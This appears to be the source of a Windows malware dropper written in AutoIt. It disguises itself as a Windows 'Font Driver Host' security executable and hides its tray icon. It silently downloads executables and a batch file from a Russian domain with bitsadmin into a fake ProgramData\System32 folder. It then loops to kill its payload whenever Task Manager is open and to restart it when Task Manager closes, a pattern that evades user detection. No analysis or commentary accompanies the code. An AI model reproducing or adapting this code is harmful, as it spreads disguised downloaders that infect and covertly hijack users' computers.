#NoTrayIcon
#Region
	#AutoIt3Wrapper_OutFile=Security32.exe
	#AutoIt3Wrapper_OutFile_X64=Security.exe
	#AutoIt3Wrapper_Compile_both=y
	#AutoIt3Wrapper_UseX64=y
	#AutoIt3Wrapper_Res_Comment=Windows Driver Host
	#AutoIt3Wrapper_Res_Description=Font Driver Host
	#AutoIt3Wrapper_Res_Fileversion=10.9.14393.0
...
#Region
	#060
	Run(@ComSpec & " /c " & 'bitsadmin /transfer /download /priority high "http://porntovirt.ru/108/system.exe" "C:\ProgramData\System32\system.exe"', "", @SW_HIDE)
	Run(@ComSpec & " /c " & 'bitsadmin /transfer /download /priority high "http://porntovirt.ru/108/Security.exe" "C:\ProgramData\System32\Security.exe"', "", @SW_HIDE)
	Run(@ComSpec & " /c " & 'bitsadmin /transfer /download /priority high "http://porntovirt.ru/108/1.bat" "C:\ProgramData\System32\1.bat"', "", @SW_HIDE)
	While 1
		If ProcessExists("Taskmgr.exe") OR ProcessExists("taskmgr.exe") Then
			ProcessClose("system.exe")
		Else
		EndIf
		Sleep(500)
		If NOT ProcessExists("system.exe") AND NOT ProcessExists("Taskmgr.exe") AND NOT ProcessExists("taskmgr.exe") Then
			Run(@ComSpec & " /c " & "C:\ProgramData\System32\1.bat", "", @SW_HIDE)
			Sleep(500)
		Else
		EndIf
	WEnd
